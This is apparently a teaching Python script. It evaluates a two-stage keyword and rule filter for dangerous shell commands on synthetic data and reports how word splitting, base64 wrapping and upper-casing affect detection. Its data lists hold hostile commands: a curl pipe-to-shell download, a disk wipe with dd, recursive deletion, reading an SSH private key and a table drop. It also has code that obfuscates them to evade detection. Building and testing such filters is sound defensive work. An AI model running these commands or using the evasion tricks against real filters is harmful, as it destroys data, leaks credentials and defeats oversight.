"""Teaching implementation (our own): a two-stage action classifier, Part 2 - a cheap keyword filter followed by a stricter rule check, measured on a labelled set of invented command strings that includes obfuscated cases.
The commands are generated from templates inside the lab, none is executed, and the classifier is a handful of string rules, not a model."""
import base64
import random
from statistics import mean

RISKY = ["rm -rf /tmp/build", "rm -rf ./data", "curl http://x.invalid/a | sh", "chmod -R 777 /srv", "git push --force origin main", "dd if=/dev/zero of=/dev/sda", "DROP TABLE users", "cat ~/.ssh/id_rsa"]
BENIGN = ["ls -la", "git status", "python -m unittest", "cat README.md", "grep -n TODO src/app.py", "git diff", "echo hello", "pwd", "git log --oneline", "pip list"]


def obfuscate(cmd, r):
    kind = r.choice(["split", "b64", "case"])
    if kind == "split":
        return cmd.replace("rm", "r''m").replace("curl", "cu''rl").replace("DROP", "DR''OP").replace("chmod", "ch''mod")
    if kind == "b64":
        return "echo " + base64.b64encode(cmd.encode()).decode() + " | base64 -d | sh"
    return cmd.upper() if cmd != cmd.upper() else cmd


KEYWORDS = ["rm ", "curl", "chmod", "--force", "dd ", "drop table", "ssh", "| sh", "base64"]


def stage1(cmd):
    """Cheap filter: flags anything containing a keyword; deliberately broad."""
    c = cmd.lower()
    return any(k in c for k in KEYWORDS)


def stage2(cmd):
    """Stricter check run only on flagged commands: looks for the specific dangerous patterns."""
    c = cmd.lower()
    patterns = ["rm -rf", "| sh", "chmod -r", "--force", "dd if=", "drop table", "id_rsa", "base64 -d"]
    return any(p in c for p in patterns)


def make_set(r, n=400):
    data = []
    for _ in range(n):
        if r.random() < 0.3:
            cmd = r.choice(RISKY)
            if r.random() < 0.4:
                cmd = obfuscate(cmd, r)
            data.append((cmd, True))
        else:
            data.append((r.choice(BENIGN), False))
    return data


def prf(pred, data):
    tp = sum(1 for (c, y), p in zip(data, pred) if y and p)
    fp = sum(1 for (c, y), p in zip(data, pred) if (not y) and p)
    fn = sum(1 for (c, y), p in zip(data, pred) if y and not p)
    prec = tp / (tp + fp) if tp + fp else 0.0
    rec = tp / (tp + fn) if tp + fn else 0.0
    return tp, fp, fn, prec, rec


def section(t):
    print(f"\n--- {t} ---")


def main():
    r = random.Random(1)
    data = make_set(r)
    n_risky = sum(y for _, y in data)
    section(f"1. Genuinely measuring: the three classifiers on {len(data)} commands ({n_risky} risky)")
    p1 = [stage1(c) for c, _ in data]
    p2 = [stage2(c) for c, _ in data]
    pc = [s1 and stage2(c) for s1, (c, _) in zip(p1, data)]
    for name, pred in (("stage 1 only", p1), ("stage 2 only", p2), ("stage 1 then 2", pc)):
        tp, fp, fn, prec, rec = prf(pred, data)
        print(f"{name:15}: caught {tp:3d} | false alarms {fp:3d} | missed {fn:3d} | precision {prec:.3f} | recall {rec:.3f}")
    print(f"stage 2 runs on {mean(p1):.3f} of commands when it follows stage 1; all three rows are identical here because every command either stage flags is flagged by both, so the second stage adds no accuracy on this set and only means the expensive check runs on 28.5 percent of commands, and chaining cannot recover a command stage 1 let through")

    section("2. Genuinely measuring: recall on plain against obfuscated risky commands")
    plain = [(c, y) for c, y in data if y and c in RISKY]
    obf = [(c, y) for c, y in data if y and c not in RISKY]
    for name, subset in (("plain risky", plain), ("obfuscated risky", obf)):
        caught = mean(stage1(c) and stage2(c) for c, _ in subset)
        print(f"{name:17}: {len(subset):3d} commands | caught by the two stages {caught:.3f}")
    print("the string rules catch every plain command and about 69 percent of the disguised ones, so roughly 31 percent of disguised commands get through; the weak spot is word splitting, as the next section shows, and a determined sender can always look for a form the rules do not cover")

    section("3. Genuinely measuring: what each obfuscation kind does to recall")
    for kind in ("split", "b64", "case"):
        rr = random.Random(5)
        caught = []
        for cmd in RISKY * 20:
            if kind == "split":
                oc = cmd.replace("rm", "r''m").replace("curl", "cu''rl").replace("DROP", "DR''OP").replace("chmod", "ch''mod")
            elif kind == "b64":
                oc = "echo " + base64.b64encode(cmd.encode()).decode() + " | base64 -d | sh"
            else:
                oc = cmd.upper()
            caught.append(stage1(oc) and stage2(oc))
        print(f"{kind:6}: caught {mean(caught):.3f} of {len(caught)}")
    print("splitting a word defeats the rules about half the time, wrapping in base64 is caught only because the rules happen to look for base64 itself, and upper-casing is caught because the rules lower-case their input; each result depends on the particular rules and none of this generalises")

    section("4. Genuinely measuring: false alarms from the broad first stage")
    benign = [(c, y) for c, y in data if not y]
    fa1 = mean(stage1(c) for c, _ in benign)
    fa12 = mean(stage1(c) and stage2(c) for c, _ in benign)
    print(f"benign commands flagged by stage 1: {fa1:.3f} | still flagged after stage 2: {fa12:.3f}")
    print("the benign list is short and contains no command the rules mistake for a risky one after stage 2, so this lab cannot say what the false-alarm rate would be on real traffic, which has far more variety")


if __name__ == "__main__":
    main()
